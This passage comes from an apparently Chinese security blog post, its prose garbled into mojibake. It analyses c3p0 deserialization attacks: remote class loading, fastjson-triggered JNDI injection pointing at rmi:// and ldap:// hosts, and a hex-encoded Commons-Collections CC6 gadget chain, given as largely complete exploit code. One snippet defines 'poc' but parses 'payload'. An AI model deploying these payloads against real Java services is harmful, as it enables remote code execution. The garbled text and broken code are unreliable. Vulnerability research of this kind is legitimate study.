class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Deserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">EXP_Loader</span> <span class="variable">exp_loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EXP_Loader</span>();</span><br><span class="line">        Pool_Serial(exp_loader);</span><br><span class="line">        Pool_Deserial();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ¶æ„ç±»ä¸€å®šæ³¨æ„ä¸è¦æœ‰åŒ…åä¸ç„¶ä¼šæŠ¥é”™ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢è®°å½•ä¸€ä¸‹è¿™ä¸ªé“¾çš„è°ƒç”¨è¿‡ç¨‹ã€‚</p>
<h3 id="æ‰§è¡Œæµç¨‹è¯¦è§£">æ‰§è¡Œæµç¨‹è¯¦è§£</h3>
<p>é¦–å…ˆæˆ‘ä»¬å…ˆæ‰¾åˆ°æ¼æ´çš„è§¦å‘ç‚¹æ˜¯åœ¨com/mchange/v2/naming/ReferenceableUtils.javaè¿™ä¸ªç±»çš„referentoobjectæ–¹æ³•é‡Œ</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739252255-65084146-295d-419d-8a75-1887fcf2b96f.png" alt=""></p>
<p>å¾ˆæ˜æ˜¾ï¼Œè¯¥æ–¹æ³•æ˜¯ç”¨æ¥è¿›è¡Œç±»åŠ è½½çš„ã€‚å¦‚æœè®¾ç½®äº†ä¸€ä¸ªè¿œç¨‹å·¥å‚ç±»åœ°å€<code>fClassLocation</code>ï¼Œåˆ™ä¼šä½¿ç”¨URLClassLoaderè¿›è¡Œè¿œç¨‹ç±»åŠ è½½ã€‚</p>
<p>ç„¶åçœ‹ä¸€ä¸‹è°è°ƒç”¨äº†ä»–</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739365446-70ca4d16-5018-4556-b08e-bbf66452042b.png" alt=""></p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739324139-afb7ca42-2180-43a2-b10e-11c929942eb6.png" alt=""></p>
<p>å¯ä»¥æ‰¾åˆ°æ˜¯ReferenceableUtilsè¿™ä¸ªç±»çš„getObjectæ–¹æ³•è°ƒç”¨äº†ä»–ï¼Œå†ç»§ç»­æ‰¾ä¸€ä¸‹æ˜¯è°è°ƒç”¨äº†ä»–</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739476878-ec11bb2c-2656-45ef-9529-58e5c924f7f2.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯PoolBackedDataSourceBaseçš„readObjectæ–¹æ³•ä¸­ä¼šè¿›è¡Œè°ƒç”¨ï¼Œæ‰€ä»¥è¿™é‡Œè°ƒç”¨é“¾å°±å‡ºæ¥äº†ã€‚</p>
<p>ä¸è¿‡è¿™é‡Œæˆ‘ä»¬è¿˜è¦è¯¦ç»†çœ‹ä¸€ä¸‹ä»–çš„readobjectæ–¹æ³•</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739576691-a4c2214b-4466-44a0-82d9-ba2a9ed6b966.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°åœ¨è°ƒç”¨ä»–ä¹‹åä¼šå¼ºåˆ¶è½¬æ¢ä¸ºConnectionPoolDataSourceç±»å‹è·Ÿè¿›å»çœ‹çœ‹è¿™ä¸ªç±»</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739622429-1d6375a3-1f4a-42b2-a34e-df613f4f9795.png" alt=""></p>
<p>æˆ‘ä»¬å‘ç°ä»–å¹¶æ²¡æœ‰å®ç°åºåˆ—åŒ–ï¼Œæ‰€ä»¥ä»–æ˜¯æ²¡æ³•è¢«è¿›è¡Œåºåˆ—åŒ–çš„é‚£ä¹ˆè¿™é‡Œä¸ºä»€ä¹ˆèƒ½è½¬æˆè¿™ä¸ªå¯¹è±¡å‘¢</p>
<p>æˆ‘ä»¬åˆ°ä»–çš„writeObejctä¸­çœ‹ä¸€ä¸‹</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739776286-6d3851cb-3053-48f6-a526-265c5f1bec82.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¦‚æœä¸èƒ½è¿›è¡Œåºåˆ—åŒ–è¿™ä¸ªç±»çš„è¯ä¼šèµ°åˆ°catchæ–¹æ³•é‡Œç”¨<code>ReferenceIndirector.indirectForm(connectionPoolDataSource)</code>å¯¹å…¶è¿›è¡ŒåŒ…è£…æœ€ç»ˆä¼šè¿”å›ä¸€ä¸ª<code>ReferenceSerialized</code>ç±»</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739914284-7c89ef0e-6185-4e19-b222-b5a5bb54fb52.png" alt=""></p>
<p>æ‰€ä»¥<code>ConnectionPoolDataSource</code>ç±»ç»è¿‡åºåˆ—åŒ–åï¼Œå¾—åˆ°çš„æœ€ç»ˆæ˜¯<code>ReferenceSerialized</code>ç±»ï¼Œå› æ­¤åœ¨<code>PoolBackedDataSourceBase#readObject</code>ä¸­è°ƒç”¨çš„å…¶å®æ˜¯<code>ReferenceSerialized#getObject()</code>æ–¹æ³•ã€‚</p>
<p>è¿™é‡Œä¸€å®šè¦è‡ªå·±è·Ÿä¸€ä¸‹ä»–åºåˆ—åŒ–çš„æµç¨‹å¦åˆ™åé¢çš„pocçœ‹èµ·æ¥å¯èƒ½ä¼šæœ‰ç‚¹ç–‘é—®ã€‚å¯ä»¥çœ‹åˆ°ä»–è°ƒç”¨äº†indirectFormå¯¹connectionPoolDataSourceè¿›è¡Œå°è£…ï¼Œç„¶åè°ƒç”¨äº†getReferenceæ–¹æ³•å°†è·å–å¼•ç”¨å¹¶å®ä¾‹åŒ–è¿›å»ï¼Œè¿™é‡Œå°±æ˜¯æˆ‘ä»¬çš„å¯æ§ç‚¹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥æ¶æ„åœ°å€çš„åœ°æ–¹ã€‚è¿™æ¡é“¾å…¶å®ç®—æ˜¯å€Ÿé¸¡ç”Ÿè›‹ï¼Œå°±æ˜¯å€Ÿç€<code>ConnectionPoolDataSource</code>ç±»æ¥ä¸‹çš„<code>ReferenceSerialized</code>ğŸ¥šã€‚</p>
<p>æ‰€ä»¥åˆ°è¿™å¤§ç›–å°±èƒ½æ˜ç™½pocçš„å†™æ³•äº†</p>
<p>è®°å½•ä¸‹è°ƒç”¨é“¾</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PoolBackedDataSourceBase#readObject -&gt;</span><br><span class="line">ReferenceSerialized#getObject -&gt;</span><br><span class="line">ReferenceableUtils#referenceToObject -&gt;</span><br><span class="line">ObjectFactory#getObjectInstance</span><br><span class="line">URLclassLoader ç±»åŠ è½½</span><br></pre></td></tr></table></figure>
<h2 id="jndiåˆ©ç”¨">jndiåˆ©ç”¨</h2>
<p>è¿™é‡Œéœ€è¦ä¾èµ–äº fastjson å’Œ jacksonå»åˆ©ç”¨ã€‚å…ˆç»™å‡ºpoc</p>
<h3 id="poc-2">poc</h3>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,\&quot;jndiName\&quot;: \&quot;rmi://127.0.0.1:1099/e6pbsf\&quot;,\&quot;loginTimeout\&quot;:0&#125;&quot;</span>;        </span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="è°ƒè¯•æµç¨‹">è°ƒè¯•æµç¨‹</h3>
<p>å…ˆçœ‹è°ƒç”¨çš„è§¦å‘ç‚¹</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746176829-859f9f53-6eed-48a5-8c0c-0321238816c3.png" alt=""></p>
<p>åœ¨com/mchange/v2/c3p0/JndiRefForwardingDataSource.javaè¿™ä¸ªç±»çš„dereferenceæ–¹æ³•é‡Œå­˜åœ¨jndiæ³¨å…¥çš„æ¼æ´ã€‚æ¥ä¸‹æ¥å¯»æ‰¾åœ¨å“ªè°ƒç”¨äº†dereferenceè¿™ä¸ªæ–¹æ³•</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746266097-036727d5-c545-455b-989b-2adeab7570d7.png" alt=""></p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746291825-b27c8c84-a0a4-4987-b88e-de3892bb1df2.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°è¿˜æ˜¯è¯¥ç±»çš„inneræ–¹æ³•ï¼Œç»§ç»­çœ‹åœ¨å“ªè°ƒç”¨äº†è¯¥inneræ–¹æ³•</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746347612-80d0badd-c1c7-4fa6-b7a0-98a234e472a1.png" alt=""></p>
<p>æœ‰å¥½å¤šä¸ªè¿™é‡Œå¯ä»¥åˆ©ç”¨çš„æ˜¯setLoginTimeoutæ–¹æ³•ã€‚ä»–æ¥å—ä¸€ä¸ªintç±»å‹çš„ä¼ å‚æ•°ã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œå°±å¯ä»¥ç»“åˆfastjsonè§¦å‘äº†ã€‚æ‰¾ä¸€ä¸‹jndiNameèµ‹å€¼ä¹Ÿæœ‰<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733749699231-57699f34-8167-4127-a3c2-b4c5f6950239.png" alt=""></p>
<p>åœ¨å…¶çˆ¶ç±»é‡Œé¢JndiRefDataSourceBase</p>
<p>å…¶å®è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªè§¦å‘é“¾æ¡å°±æ˜¯åœ¨è¿™ä¸ªç±»JndiRefConnectionPoolDataSourceä¸­<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748183528-c51e0183-82d1-496f-aed0-b7ba299c1c69.png" alt=""></p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748201395-6b31303f-9a2c-449d-af4a-712dc5615ee5.png" alt=""></p>
<p>åŒæ—¶æˆ‘ä»¬åœ¨è¿™ä¸ªç±»ä¸­</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748244314-03111f56-2ca4-4387-ab9e-7faa11148160.png" alt=""></p>
<p>ä»–æ˜¯è°ƒç”¨äº†com/mchange/v2/c3p0/WrapperConnectionPoolDataSource.javaè¿™ä¸ªç±»ä¸­çš„setLoginTimeoutæ–¹æ³•</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748266853-84887910-587e-42e2-9199-be81311862ae.png" alt=""></p>
<p>çœ‹çœ‹è¿™ä¸ªgetNesteDataSourceæ–¹æ³•</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748309464-474dc855-e8bb-4baa-8d7b-d631ac850fa1.png" alt=""></p>
<p>ç›´æ¥è¿”å›äº†nestedDataSourceå¯¹è±¡å…¶å®è°ƒè¯•ä¼šå‘ç°è¿™ä¸ªå€¼æœ€ç»ˆæ˜¯com/mchange/v2/c3p0/JndiRefForwardingDataSource.javaè¿™ä¸ªç±»çš„å¯¹è±¡</p>
<p>æ‰€ä»¥å°±å¯ä»¥é€šè¿‡fastjsonç»“åˆcom/mchange/v2/c3p0/JndiRefConnectionPoolDataSource.javaè¿™ä¸ªç±»è¿›è¡Œæ„é€ äº†</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;jndiName\&quot;:\&quot;ldap://10.6.42.156:8085/NpgoGBfd\&quot;,\&quot;LoginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="C3P0-ä¹‹-HEXæµåŠ è½½ä»»æ„ç±»æ”»å‡»">C3P0 ä¹‹ HEXæµåŠ è½½ä»»æ„ç±»æ”»å‡»</h2>
<p>æ¼æ´ä¸»è¦å‘ç”Ÿåœ¨WrapperConnectionPoolDataSourceè¿™ä¸ªç±»ä¸­ï¼Œæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç±»</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755319222-fef10b27-245e-4d75-bc01-fb643f2c3c3d.png" alt=""></p>
<p>çœ‹åˆ°ä»–çš„æ„é€ æ–¹æ³•è°ƒç”¨äº†parseUserOverridesAsStringæ–¹æ³•ä¼ å…¥çš„æ˜¯userOverridesAsStringè¿™ä¸ªå±æ€§</p>
<p>ï¿½<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755392004-f2e17934-c4e6-4a48-b556-7503045af6d0.png" alt=""></p>
<p>æ¥ç€æ¥çœ‹çœ‹è¿™ä¸ªæ–¹æ³•å¹²äº†å•¥å¯ä»¥çœ‹åˆ°é¦–å…ˆè¿›è¡Œå­—ç¬¦æˆªå–å°†æœ€åä¸€ä½å’Œ<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755424923-caa297d3-19a0-4fba-898a-4aa0d8e2c09b.png" alt=""></p>
<p>è§£æè¿‡ç¨‹ä¸­è°ƒç”¨äº†substring()æ–¹æ³•å°†å­—ç¬¦ä¸²å¤´éƒ¨çš„<code>HASM_HEADER</code>æˆªå»äº†ï¼Œå› æ­¤æˆ‘ä»¬åœ¨æ„é€ æ—¶éœ€è¦åœ¨åå…­è¿›åˆ¶å­—ç¬¦ä¸²å¤´éƒ¨åŠ ä¸Š<code>HASM_HEADER</code>ï¼Œå¹¶ä¸”ä¼šæˆªå»å­—ç¬¦ä¸²æœ€åä¸€ä½ï¼Œæ‰€ä»¥éœ€è¦åœ¨ç»“å°¾åŠ ä¸Šä¸€ä¸ª<code>;</code></p>
<p>ç„¶åå°†è§£ç çš„æ•°æ®ä¼ å…¥åˆ°SerializableUtils.fromByteArrayæ–¹æ³•è·Ÿè¿›å»</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755545849-e6e31c9e-2baa-4a24-828e-13b6600657b0.png" alt=""></p>
<p>ç»§ç»­è°ƒç”¨ï¼Œç»§ç»­è·Ÿ</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755563662-2da85cd2-4d93-41d3-8ad3-854765887ebd.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°å­˜åœ¨readObjectååºåˆ—åŒ–ã€‚</p>
<p>ç„¶åæˆ‘ä»¬èƒ½è”æƒ³åˆ°fastjsonä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨setteræ–¹æ³•æ‰€ä»¥å»æ‰¾ä¸€ä¸‹</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755761615-f897c144-2963-46c9-a953-83a3e318dfeb.png" alt=""></p>
<p>åœ¨å…¶çˆ¶ç±»WrapperConnectionPoolDataSourceBaseé‡Œæ‰¾åˆ°äº†setteræ–¹æ³•å¯æ§æ‰€ä»¥å°±å¯ä»¥æ¥ç»“åˆfastjsonæ¥æ„é€ äº†</p>
<h3 id="poc-3">poc</h3>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyVetoException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_Hex</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//CC6çš„åˆ©ç”¨é“¾</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">CC6</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//ä½¿ç”¨InvokeTransformeråŒ…è£…ä¸€ä¸‹</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry,<span class="string">&quot;eee&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹LazyMapç±»çš„factoryå±æ€§</span></span><br><span class="line">        Class clazz=LazyMap.class;</span><br><span class="line">        Field factoryField= clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> hashMap2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);</span></span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†ç±»åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å­—èŠ‚æ•°ç»„è½¬åå…­è¿›åˆ¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException &#123;</span><br><span class="line">        <span class="type">String</span> <span 